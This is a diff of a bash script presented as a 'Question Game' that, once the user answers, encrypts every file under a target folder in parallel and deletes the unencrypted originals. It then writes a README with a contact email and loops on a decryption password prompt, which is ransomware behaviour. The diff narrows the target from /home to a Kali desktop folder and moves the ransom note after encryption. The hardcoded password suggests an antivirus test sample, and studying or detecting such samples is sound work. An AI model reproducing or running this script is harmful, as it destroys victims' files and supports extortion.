@@ -1,9 +1,5 @@
 #!/bin/bash
 
-# Create a README.md file with contact details
-echo "Contact Information:" > README.md
-echo "Email: semaemirhan555@gmail.com" >> README.md
-
 # Prompt the user with a question game
 echo "Welcome to the Question Game!"
 echo "Answer the following question to proceed."
@@ -25,7 +21,7 @@ fi
 echo "Correct! Access granted. Please wait for the next game."
 
 # Continue with file encryption
-folder_to_encrypt="/home"
+folder_to_encrypt="/home/kali/Masaüstü/clam"
 password="hydradragonantivirushere"
 script_to_exclude="mygame.sh"
 
@@ -52,6 +48,10 @@ export -f encrypt_files
 find "$folder_to_encrypt" -type f -print0 | xargs -0 -n 1 -P $(nproc) bash -c 'encrypt_files "$0"'
 
 echo "All files have been encrypted, and unencrypted files have been deleted."
+
+# Create a README.md file with contact details
+echo "Contact Information:" > README.md
+echo "Email: semaemirhan555@gmail.com" >> README.md
 
 # Loop for decryption with password verification
 while true; do
